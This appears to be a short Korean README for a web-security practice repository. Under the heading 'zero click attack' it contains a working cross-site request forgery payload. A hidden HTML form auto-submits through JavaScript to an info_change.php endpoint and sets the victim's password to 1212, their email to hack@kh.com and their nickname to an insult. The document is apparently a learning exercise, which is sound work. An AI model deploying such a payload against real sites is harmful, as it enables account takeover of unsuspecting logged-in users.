# web3

<h1> 웹 보안 연습용 </h1> 
<p> 2021년 6월 12일 시작 </p>

  * <h3>제로 클릭 어택 </h3>


          <form  id="hack" action="../info_change.php" method="POST">
          <input type="hidden" name="user_pw1" value="1212" >
          <input type="hidden" name="user_pw2" value="1212" >
          <input type="hidden" name="age" value="50">
          <input type="hidden" name="nick" value="멍청이">
          <input type="hidden" name="email" value="hack@kh.com">
          </form>
          <script>
          document.getElementById("hack").submit();
          </script    >
